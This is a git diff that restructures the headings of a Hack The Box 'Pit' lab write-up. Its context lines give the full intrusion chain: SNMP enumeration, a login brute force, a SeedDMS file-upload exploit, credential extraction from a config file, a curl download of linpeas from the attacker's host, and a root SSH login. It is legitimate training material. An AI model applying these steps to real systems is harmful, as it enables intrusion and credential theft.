@@ -2,8 +2,9 @@
 IP address : 10.10.10.241\
 OS : Linux
 
-## Enumeration
-Firstly, let us enumerate all the open ports using ```Nmap```
+## Discovery
+### Nmap
+Firstly, let us enumerate all the open ports using Nmap
 * sV : service detection
 * sC : Run default nmap scripts
 * A : identify the OS behind each ports
@@ -13,7 +14,7 @@ Firstly, let us enumerate all the open ports using ```Nmap```
 nmap -sC -sV -A -p- -T4 10.10.10.241 -vv
 ```
 
-From the output of ```NMAP```, we are able to obtain the following information about the open TCP ports:
+From the output of Nmap, we are able to obtain the following information about the open TCP ports:
 | Port Number | Service | Version | State |
 |-----|------------------|----------------------|----------------------|
 | 22	| SSH | OpenSSH 8.0 (protocol 2.0) | Open |
@@ -41,7 +42,7 @@ Now, we will do a scan on the UDP ports to find any possible open UDP ports
 ```
 sudo nmap -sU -Pn 10.10.10.241 -T4 -vv 
 ```
-From the output of ```NMAP```, we are able to obtain the following information about the open UDP ports
+From the output of Nmap, we are able to obtain the following information about the open UDP ports
 | Port Number | Service | Version | State |
 |-----|------------------|----------------------|----------------------|
 | 161	| snmp | NMPv1 server; net-snmp SNMPv3 server (public) | Open |
@@ -49,7 +50,7 @@ From the output of ```NMAP```, we are able to obtain the following information a
 | 17455	| unknown | admin-prohibited | Open |
 | 34862	| unknown | admin-prohibited | Open |
 
-## Discovery
+### Web content discovery
 Lets now visit the web server and observe what happens
 * ```http://dms-pit.htb``` returns a status code of 403 which means that the webpage exists but we are not authorized to view it. 
 * ```http://pit.htb:80``` returns a test page for Nginx HTTP Server on Red Hat Enterprise Linux 
@@ -68,6 +69,9 @@ http://pit.htb:80 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[1
 ┌──(kali㉿kali)-[~]
 └─$ whatweb http://dms-pit.htb
 http://dms-pit.htb/ [403 Forbidden] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.241], Title[403 Forbidden], nginx[1.14.1]   
+
+### Dirb
+
 ```
 Directory enumeration with ```dirb``` on ```pit.htb:9090``` returns some meaningful output. However, upon furthur investigation they are not exploitable.
 ```
@@ -95,7 +99,8 @@ END_TIME: Sun Aug 15 11:37:22 2021
 DOWNLOADED: 4612 - FOUND: 2
 ```
 
-From the previous ```NMAP``` scan, we know that port 161 is running on SNMP server and it is using a Public community string for authentication. 
+### SNMP enumeration
+From the previous Nmap scan, we know that port 161 is running on SNMP server and it is using a Public community string for authentication. 
 Public community string is a default community string and is used as a password to access the SNMP server. However, this public string only allows users to have read access but not write access.
 ```
 NMPv1 server; net-snmp SNMPv3 server (public)
@@ -105,6 +110,8 @@ Next, we will use ```snmpwalk``` to enumerate all the information on the SNMP se
 ```
 snmpwalk -v 1 -c public 10.10.10.241 .1 > snmp    
 ```
+
+### Analysis on SNMP file output 
 Analyzing the file, we are able to discover a few interesting information such as the existence of a directory ```/var/www/html/seeddms51x/seeddms```, which may be accessible from the website as well as, several credentials 
 ```
 ## Suspicious directory (might be accessible from the web server)
@@ -117,6 +124,8 @@ michelle             user_u               s0                   *
 root                 unconfined_u         s0-s0:c0.c1023       *
 ```
 
+## Exploit
+### Brute force login on web application
 Let's now try to access ```/seeddms51x/seeddms``` on the web server.
 * ```http://pit.htb/seeddms51x/seeddms``` returns a Nginx error on the webpage
 * ```https://pit.htb:9090/seeddms51x/seeddms``` just returns a CentOS admin login page
@@ -135,6 +144,8 @@ Set-Cookie: mydms_session=30bc74de3d5d3f515046b817c127d006; path=/seeddms51x/see
 Location: /seeddms51x/seeddms/out/out.ViewFolder.php?folderid=1
 Content-Length: 0
 ```
+
+### CBE-2019-12744
 Logging into the site using the discovered credentials, we were able to find a know that the version of SeedDMS used is version ```5.1.15```. We will then look for exploits related to SeedDMS 5.1.15 using exploitDB. We are also able to find a ```CHANGELOG``` file, but the file does not provide any information that points to any possible exploitation.
 ```
 Dear colleagues, Because of security issues in the previously installed version (5.1.10), I upgraded SeedDMS to version 5.1.15. See the attached CHANGELOG file for more information. If you find any issues, please report them immediately to admin@dms-pit.htb
@@ -148,6 +159,7 @@ After uploading the file, we will be able to obtain our ```documentid``` and we 
 
 ![Creating the POC](https://github.com/joelczk/writeups/blob/main/HTB/Images/Pit/POC.PNG)
 
+### Obtaining database credentials
 Next,we will try to do a reverse shell back to our attacking machine. However, this time round the exploit seems to have failed (Probably due to some WAF filtering). So, what we do next is to traverse through the directory to find for more information. Thankfully, we were able to find ```/var/www/html/seeddms51x/data/conf/settings.xml```. However, viewing it on the website only provides us with a few text that looks like some Ubuntu command. However, what was weird was that there was the highlighting of the empty spaces on the website when we try to highlight the webpage. This got me thinking that there may be some hidden chracters not shown on the webpage itself.
 
 ![Viewing weird encoding on the website](https://github.com/joelczk/writeups/blob/main/HTB/Images/Pit/weird_encoding.PNG)
@@ -170,7 +182,7 @@ Next, I try to view the source code of the webpage and was able to find the full
     <smtp smtpServer="localhost" smtpPort="25" smtpSendFrom="seeddms@localhost" smtpUser="" smtpPassword=""/> 
 ```
 
-## Obtaining user flag
+### Obtaining user flag
 Using the database password and the user ```michelle``` as the username, we are able to login to the web admin portal on ```pit.htb:9090```. This portal seems to be a monitoring platform to monitor the services/infrastructure of the web servers. Researching on the CentOS web admin portal, we are able to find a ```/system/terminal``` endpoints that contains a web terminal. \
 From the web terminal, we are then able to obtain the user flag.
 ```
@@ -181,7 +193,7 @@ user.txt
 [michelle@pit ~]$ 
 ```
 
-## Obtaining system flag
+## Exploiting /usr/bin/monitor
 First, let run the ```linpeas``` script to check the permissions on this terminal. However, the script was unable to provide any meaningful output about possible privilege escalations. 
 ```
 [michelle@pit ~]$ curl -o linpeas.sh http://10.10.16.250:8000/linpeas.sh
@@ -297,7 +309,8 @@ iso.3.6.1.4.1.8072.1.3.2.2.1.6.10.109.111.110.105.116.111.114.105.110.103 = INTE
 iso.3.6.1.4.1.8072.1.3.2.2.1.7.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
 iso.3.6.1.4.1.8072.1.3.2.2.1.20.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 4
 iso.3.6.1.4.1.8072.1.3.2.2.1.21.10.109.111.110.105.116.111.114.105.110.103 = INTEGER: 1
-                                                                                                     
+
+### Obtaining root flag
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ ssh -i key root@10.10.10.241                                                                 1 ⚙
 The authenticity of host '10.10.10.241 (10.10.10.241)' can't be established.
